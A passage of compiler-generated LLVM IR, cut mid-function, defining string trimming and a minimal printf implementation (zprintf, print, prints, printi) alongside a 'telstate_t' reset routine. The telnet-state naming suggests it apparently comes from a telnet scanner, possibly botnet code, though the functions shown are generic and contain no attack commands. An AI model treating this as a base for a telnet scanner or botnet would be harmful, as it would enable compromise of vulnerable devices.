  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #9
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.209, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

